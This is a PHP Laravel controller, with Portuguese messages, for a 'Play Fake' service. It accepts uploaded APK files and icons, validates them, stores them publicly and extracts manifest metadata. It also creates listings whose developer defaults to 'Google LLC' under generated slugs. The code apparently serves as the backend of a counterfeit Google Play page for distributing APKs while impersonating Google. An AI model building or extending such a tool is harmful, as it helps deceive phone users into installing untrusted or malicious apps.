<?php

namespace App\Http\Controllers;

use App\Models\PlayFakeApp;
use App\Services\ApkParser;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Storage;
use ZipArchive;

class PlayFakeController extends Controller
{
    private function authorizeOwner(PlayFakeApp $app, Request $request): void
    {
        if ($request->user()->role !== 'admin' && $app->user_id !== $request->user()->id) {
            abort(403, 'Acesso não autorizado.');
        }
    }

    public function index(Request $request)
    {
        $user = $request->user();
        $query = PlayFakeApp::query();
        if ($user->role !== 'admin') {
            $query->where('user_id', $user->id);
        }
        $apps = $query->orderBy('id', 'desc')->get();
        return response()->json(['data' => $apps, 'apps' => $apps]);
    }

    public function store(Request $request)
    {
        // Limites alinhados: PHP 55M / nginx 55M / Laravel 51200KB (50MB).
        // mimes:apk,zip — APK é um ZIP assinado; alguns ambientes detectam como zip.
        $request->validate([
            'name'         => 'required|string|max:255',
            'developer'    => 'nullable|string|max:255',
            'package_name' => 'nullable|string|max:255',
            'apk_url'      => 'nullable|string',
            'apk_file'     => 'nullable|file|max:51200|mimes:apk,zip',
            'icon_file'    => 'nullable|image|max:5120',
        ]);

        $filePath = null;
        $fileSize = null;
        $iconPath = null;

        if ($request->hasFile('apk_file')) {
            $file = $request->file('apk_file');

            $handle = fopen($file->getRealPath(), 'rb');
            $header = fread($handle, 4);
            fclose($handle);
            if ($header !== "PK\x03\x04") {
                return response()->json(['message' => 'O arquivo enviado não é um APK válido (cabeçalho ZIP/PK inválido).'], 422);
            }

            $zip = new ZipArchive();
            if ($zip->open($file->getRealPath()) === true) {
                if ($zip->locateName('AndroidManifest.xml') === false) {
                    $zip->close();
                    return response()->json(['message' => 'Arquivo APK corrompido ou sem AndroidManifest.xml.'], 422);
                }
                $zip->close();
            }

            $fileName = time() . '_' . Str::slug($request->name) . '.apk';
            $filePath = $file->storeAs('apks', $fileName, 'public');
            $fileSize = $file->getSize();
        }

        if ($request->hasFile('icon_file')) {
            $icon = $request->file('icon_file');
            $iconName = time() . '_icon_' . Str::slug($request->name) . '.' . $icon->getClientOriginalExtension();
            $iconPath = $icon->storeAs('icons', $iconName, 'public');
        }

        $app = PlayFakeApp::create([
            'user_id'      => $request->user()->id,
            'name'         => $request->name,
            'developer'    => $request->developer ?? 'Google LLC',
            'package_name' => $request->package_name ?? 'com.' . Str::slug($request->name) . '.app',
            'slug'         => Str::slug($request->name) . '-' . Str::random(6),
            'apk_url'      => $request->apk_url,
            'file_path'    => $filePath,
            'icon_path'    => $iconPath,
            'file_size'    => $fileSize,
        ]);

        // Extração real do manifest (apktool d -> fallback zip). Não falha o upload.
        if ($filePath) {
            try {
                $meta = ApkParser::extract(storage_path('app/public/' . $filePath));
                $patch = [];
                if (!empty($meta['package_name']) && empty($request->package_name)) {
                    $patch['package_name'] = $meta['package_name'];
                }
                if (!empty($meta['version_name'])) {
                    $patch['version_name'] = $meta['version_name'];
                }
                if (!empty($meta['version_code'])) {
                    $patch['version_code'] = $meta['version_code'];
                }
                if (!empty($meta['permissions'])) {
                    $patch['permissions'] = json_encode($meta['permissions']);
                }
                if (!empty($meta['debuggable'])) {
                    $patch['debuggable'] = true;
                }
                // Só substitui o ícone se o usuário não enviou um manualmente
                if (empty($iconPath) && !empty($meta['icon_path'])) {
                    $patch['icon_path'] = $meta['icon_path'];
                }
                if (!empty($patch)) {
                    $app->update($patch);
                    $app->refresh();
                }
            } catch (\Throwable $e) {
                \Illuminate\Support\Facades\Log::warning('PlayFake extract falhou: ' . $e->getMessage());
            }
        }

        return response()->json(['message' => 'App Play Fake criado com sucesso', 'app' => $app], 201);
    }

    public function update(Request $request, PlayFakeApp $playFakeApp)
    {
        $this->authorizeOwner($playFakeApp, $request);

        $validated = $request->validate([
            'name'         => 'sometimes|string|max:255',
            'developer'    => 'nullable|string|max:255',
            'package_name' => 'nullable|string|max:255',
            'apk_url'      => 'nullable|string',
            'status'       => 'nullable|string|max:50',
        ]);

        $playFakeApp->update($validated);

        return response()->json(['message' => 'App atualizado', 'app' => $playFakeApp]);
    }

    public function destroy(Request $request, $id)
    {
        $app = PlayFakeApp::findOrFail($id);
        $this->authorizeOwner($app, $request);

        if ($app->file_path) Storage::disk('public')->delete($app->file_path);
        if ($app->icon_path) Storage::disk('public')->delete($app->icon_path);

        $app->delete();
        return response()->json(['message' => 'Aplicativo removido com sucesso.']);
    }
}